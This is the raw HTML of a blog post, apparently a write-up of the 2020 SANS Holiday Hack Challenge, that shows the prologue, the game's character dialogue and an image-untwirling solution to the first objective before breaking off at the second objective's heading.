      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElems = document.querySelectorAll('.navbar-search');
    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElems ? 
    mobileSearchBtnElems.forEach(function (elem, idx) {
      elem.addEventListener('click', function () {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'block';
        }

        if (mobileSearchInputElem) {
          mobileSearchInputElem.focus();
        }

        if (htmlElem) {
          htmlElem.style.overflowY = 'hidden';
        }
      });
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>    
    


<link rel="stylesheet" href="/css/main.min.css">



  
  
    
    <link rel="stylesheet" href="/css/custom.min.css">
  

  
  
    
    <link rel="stylesheet" href="/css/font.min.css">
  

  
  
    
    <link rel="stylesheet" href="/scss/search.min.css">
  


    
<meta name="description" content="This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain&#39;s block that was stealthily altered." />


<meta name="keywords" content="kringlecon,holidayhack">

<meta name="created" content="2021-01-12T00:00:00&#43;0000">
<meta name="modified" content="2021-01-12T00:00:00&#43;0000">
<meta property="article:published_time" content="2021-01-12T00:00:00&#43;0000">

<meta name="author" content="noobintheshell">
<meta property="article:author" content="https://noobintheshell.com/posts/kringlecon3/@noobintheshell">


<meta property="og:site_name" content="noobintheshell :: blog">
<meta property="og:title" content="KringleCon 3: Three French Hens">
<meta property="og:url" content="https://noobintheshell.com/posts/kringlecon3/">
<meta property="og:type" content="article">
<meta property="og:description" content="This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain&#39;s block that was stealthily altered.">

  
    <meta property="og:image" content="https://noobintheshell.com/images/kringlecon3/header.webp">
    <meta property="og:image:url" content="https://noobintheshell.com/images/kringlecon3/header.webp">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:app:name:iphone" content="noobintheshell :: blog">
    <meta property="twitter:title" content="KringleCon 3: Three French Hens">
    <meta property="twitter:description" content="This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain&#39;s block that was stealthily altered.">
  

<meta name="generator" content="Hugo 0.79.0" />
<meta name="msapplication-TileColor" content="#fff">

<meta name="theme-color" content="#fff">

<meta name="msapplication-navbutton-color" content="#fff">

<meta name="apple-mobile-web-app-status-bar-style" content="#fff">

<link rel="canonical" href="https://noobintheshell.com/posts/kringlecon3/">

<link rel="manifest" href="/manifest.json">

  
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/favicon.png" sizes="any" type="image/png" />
  


    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "headline": "KringleCon 3: Three French Hens",
    "datePublished": "2021-01-12T00:00:00Z",
    "dateModified": "2021-01-12T00:00:00Z",
    "url" : "https://noobintheshell.com/posts/kringlecon3/",
    "description": "This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain's block that was stealthily altered.",
    "keywords": ["kringlecon","holidayhack"],
    "image" : "https://noobintheshell.com/images/kringlecon3/header.webp",
    "author": {
      "@type": "Person",
      "name": "noobintheshell"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://noobintheshell.com"
    },
    "publisher": {
      "@type": "Organization",
      "name": "noobintheshell :: blog",
      "url": "https://noobintheshell.com"
    }
  }
</script>

    
  
  







    
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="https://unpkg.com/lunr/lunr.min.js"></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-RVT4CS59SP"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-RVT4CS59SP');
</script>
</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar scrolling" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    &nbsp;&nbsp;
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">#noobintheshell_</h6>
      </a>
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="position: absolute; top: 0;" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>



<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item active">
          <a href="/posts">Posts</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/tags">Tags</a>
        </li>
      
      
    

    
      <li class="navbarm__menu--item ">
        <a href="/tags" class="navbarm__menu--term" data-index="0">
          Tags
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/categories" class="navbarm__menu--term" data-index="1">
          Categories
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/series" class="navbarm__menu--term" data-index="2">
          Series
        </a>
      </li>
    
  </ul>
</div>
  <div class="navbar__menu">
  
  
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <a href="/posts" class="navbar__menu-item navbar__slide-down active" dir="ltr" data-ani="true">Posts</a>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/tags" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Tags</a>
  
  
  <div class="show-search">
    <a class="toggle-search" title="search posts">
        <svg xmlns="http://www.w3.org/2000/svg" width="34" height="35" viewBox="-100 100 800 680">
            <path
                d="M595.2 513.908L493.775 412.482c26.707-41.727 42.685-91.041 42.685-144.263C536.459 120.085 416.375 0 268.24 0 120.106 0 .021 120.085.021 268.219c0 148.134 120.085 268.22 268.219 268.22 53.222 0 102.537-15.979 144.225-42.686l101.426 101.463c22.454 22.453 58.854 22.453 81.271 0 22.492-22.491 22.492-58.855.038-81.308zm-326.96-54.103c-105.793 0-191.585-85.793-191.585-191.585 0-105.793 85.792-191.585 191.585-191.585s191.585 85.792 191.585 191.585c.001 105.792-85.791 191.585-191.585 191.585z" />
        </svg>
    </a>
</div>
<aside role="search">
        <div class="search-wrapper">
            <div class="close toggle-search">
                <svg height="512" width="512" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                    <path d="M443.6 387.1L312.4 255.4l131.5-130c5.4-5.4 5.4-14.2 0-19.6l-37.4-37.6c-2.6-2.6-6.1-4-9.8-4-3.7 0-7.2 1.5-9.8 4L256 197.8 124.9 68.3c-2.6-2.6-6.1-4-9.8-4-3.7 0-7.2 1.5-9.8 4L68 105.9c-5.4 5.4-5.4 14.2 0 19.6l131.5 130L68.4 387.1c-2.6 2.6-4.1 6.1-4.1 9.8 0 3.7 1.4 7.2 4.1 9.8l37.4 37.6c2.7 2.7 6.2 4.1 9.8 4.1 3.5 0 7.1-1.3 9.8-4.1L256 313.1l130.7 131.1c2.7 2.7 6.2 4.1 9.8 4.1 3.5 0 7.1-1.3 9.8-4.1l37.4-37.6c2.6-2.6 4.1-6.1 4.1-9.8-.1-3.6-1.6-7.1-4.2-9.7z"/></svg>
            </div>
            <form class="search_" method="get">
                <input type="search" placeholder="search..." disabled="disabled" />
            </form>

            <ul class="search-results">
                <li>
                </li>
            </ul> 
        </div>
</aside>

<script src="/js/search.min.e175b5801e0cbeca86c1e68a630de9556a6728307033f4efb8c956e9e1587cc1.js"></script>
</div>
</nav>
            
            

<main class="single__main main-main">
  
    <nav class="breadcrumb hide" aria-label="breadcrumbs">
  <script>document.querySelector('.breadcrumb').classList.remove('hide')</script>
  <ol>
    
  
  
  
  
  
  <li >
    
      <a href="https://noobintheshell.com/" class="capitalize">Home</a>
    
  </li>
  
  
  <li >
    
      <a href="https://noobintheshell.com/posts/" class="capitalize">Posts</a>
    
  </li>
  
  
  <li  class="is-active" >
    
      <span>KringleCon 3: Three French Hens</span>
    
  </li>
  
  </ol>
  
</nav>
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    <h2 class="single__title" data-ani="true">KringleCon 3: Three French Hens</h2>
    <h3 class="single__subtitle">The 2020 SANS HolidayHack Challenge</h3>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">📅 &nbsp;Jan 12, 2021 </time>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;87&nbsp;min read </span>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">🎅&nbsp;noobintheshell</span>
  
  <span class="single__info">
    
  </span>
</div>

      
<ul class="single__tags caption">
  
  🏷️
  

  <li><a href="https://noobintheshell.com/tags/kringlecon/" class="single__tag" title="kringlecon">#kringlecon</a></li>

  <li><a href="https://noobintheshell.com/tags/holidayhack/" class="single__tag" title="holidayhack">#holidayhack</a></li>

</ul>

    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      



  



  <div class="featured-image__wrapper">
    <img src="/images/kringlecon3/header.webp" alt="Featured Image" class="featured-image" style="width: ;height: ;">
  </div>

<h5 id="the-_sans-holiday-hack-challenge_-is-back-and-with-it-the-third-edition-of-_kringlecon_">The <em>SANS Holiday Hack Challenge</em> is back! And with it, the third edition of <em>KringleCon</em>!</h5>
<h6 id="this-years-challenges-were-a-good-mix-of-defensive-and-offensive-skills-topics-varied-from-webapp-hacking-crypto-log-analysis-binary-analysis-to-improving-js-regex-and-network-skills-there-were-as-well-some-simulated-hardware-challenges-the-most-challenging-part-was-the-analysis-and-recovery-of-a-custom-blockchains-block-that-was-stealthily-altered">This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain&rsquo;s block that was stealthily altered.</h6>
<h6 id="kringlecon-is-as-well-an-online-security-conference-and-you-can-find-all-the-talks-on-kringlecons-youtube-channelhttpswwwyoutubecomchannelucnir-c_vxv_tcfgww5vczag-this-year-was-as-well-introduced-a-discordhttpsdiscordggwbmx92rww3-channel-that-was-really-great-to-interact-with-the-community">KringleCon is as well an online security conference and you can find all the talks on <a href="https://www.youtube.com/channel/UCNiR-C_VXv_TCFgww5Vczag">KringleCon’s Youtube channel</a>. This year was as well introduced a <a href="https://discord.gg/Wbmx92rWW3">Discord</a> channel that was really great to interact with the community.</h6>
<h6 id="who-wants-to-destroy-the-holiday-season-this-year-will-__santa__-and-his-companions-be-able-to-stop-the-villain-i-will-let-you-discover-it-here-is-my-write-up-for-all-the-challenges-of-this-edition">Who wants to destroy the holiday season this year? Will <strong>Santa</strong> and his companions be able to stop the villain? I will let you discover it. Here is my write-up for all the challenges of this edition!</h6>
<h6 id="a-special-thanks-goes-to-the-whole-counter-hackhttpstwittercomcounterhackseclangen-team-for-their-incredible-work-that-was-a-blast">A special thanks goes to the whole <a href="https://twitter.com/counterhacksec?lang=en">Counter Hack</a> team for their incredible work! That was a blast!</h6>
<h2 id="prologue">Prologue</h2>
<hr />
<p>The adventure starts not far from <strong>Santa</strong>&rsquo;s new castle. We are welcomed by <strong>Jingle Ringford</strong> who proposes us a gondola ride to <strong>Santa</strong>&rsquo;s castle!</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj0_01.webp" alt="Staging area" data-caption="Staging area" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Staging area
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Jingle Ringford:</strong><br />
Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa&rsquo;s castle!<br />
Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty.<br />
Click your badge (the snowflake in the center of your avatar) to read your objectives.</p>
<p>If you&rsquo;d like to chat with the community, join us on <a href="https://discord.gg/Wbmx92rWW3">Discord</a>!<br />
We have specially appointed <em>Kringle Koncierges</em> as helpers; you can hit them up for help in the <code>#general</code> channel!</p>
<p>If you get a minute, check out <strong>Ed Skoudis</strong>' <a href="https://www.youtube.com/watch?v=8e0SZrbWFuU">official intro</a> to the con!</p>
<p>Oh, and before you head off up the mountain, you might want to try to figure out what&rsquo;s written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area.</p>
</div>
<p>We unlock the first <em>Objective</em> as well as 2 hints to solve it:</p>
<div class="notices success" data-title="Objective 1 hints">
  <ul>
<li>Image Edit Tool - There are <a href="https://www.photopea.com">tools</a> out there that could help Filter the Distortion that is this Twirl.</li>
<li>Twirl Area - Make sure you Lasso the correct twirly area.</li>
</ul>

</div>
<h2 id="objectives">Objectives</h2>
<h3 id="1---uncover-santas-giftlist">1 - Uncover Santa&rsquo;s Gift List</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj1_01.webp" alt="Objective 1 description" data-caption="Objective 1 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 1 description
      
        
        
      
    </figcaption>
  
</figure>
<p>The image on the billboard shows a document on <strong>Santa</strong>&rsquo;s desk that has been twirled:<br />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj1_02.webp" alt="billboard image" data-caption="billboard image" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      billboard image
      
        
        
      
    </figcaption>
  
</figure></p>
<p>We can un-twirl it with the <a href="https://www.photopea.com">online tool</a> that was proposed in the hints. We open the image and then start a trial and error exercise using the <code>Filter &gt; Distort &gt; Twirl tool</code> and the <code>Lasso Select</code> tool. The below selection coupled with a 360° twirl did the trick:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj1_03.webp" alt="edited billboard image" data-caption="edited billboard image" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      edited billboard image
      
        
        
      
    </figcaption>
  
</figure>
<p><div class="notices success" data-title="Objective 1 answer">
  proxmark
</div><br />
We can talk back to the elf:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Jingle Ringford:</strong><br />
Great work with that! I&rsquo;m sure you&rsquo;ll be able to help us with more challenges up at the castle!</div>
<p>We can now board the gondola to meet <strong>Santa</strong>! This unlocks <em>Objectives</em> 2 to 5 and the first narrative:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative01.webp" alt="narrative 1 of 7" data-caption="narrative 1 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      narrative 1 of 7
      
        
        
      
    </figcaption>
  
</figure>
<p>At the castle entrance where we are first greeted by <strong>Jewel Loggins</strong>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj1_04.webp" alt="castle approach" data-caption="castle approach" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      castle approach
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Jewel Loggins:</strong><br />
Welcome to the SANS Holiday Hack Challenge 2020! Have a great time! Be sure to join us on <a href="https://discord.gg/Wbmx92rWW3">Discord</a>!</p>
<p>Remember, you can get hints for each of the objectives in your badge by clicking on elves. If you help elves solve their own technical terminal challenge, they&rsquo;ll give you some ideas about how to approach the objectives.</p>
<p>Oh, and if you see any odd objects lying around, walk over to them to pick them up! You might even find one as you approach the castle!</p>
</div>
<p>We meet as well <strong>Santa</strong>&rsquo;s and the <em>3 French Hens</em>: <strong>Pierre</strong>, <strong>Marie</strong>, and <strong>Jean-Claude</strong>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj1_05.webp" alt="Santa and the 3 French Hens" data-caption="Santa and the 3 French Hens" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa and the 3 French Hens
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Santa:</strong><br />
Hello and welcome to the <em>North Pole</em>! We&rsquo;re super excited about this year&rsquo;s <em>KringleCon 3: French Hens</em>.<br />
My elves have been working all year to upgrade the castle. It was a HUGE construction project, and we&rsquo;ve nearly completed it.<br />
Please pardon the remaining construction dust around the castle and enjoy yourselves!</div>
<h3 id="2---investigate-s3bucket">2 - Investigate S3 Bucket</h3>
<hr />
<figure >
  
  
  
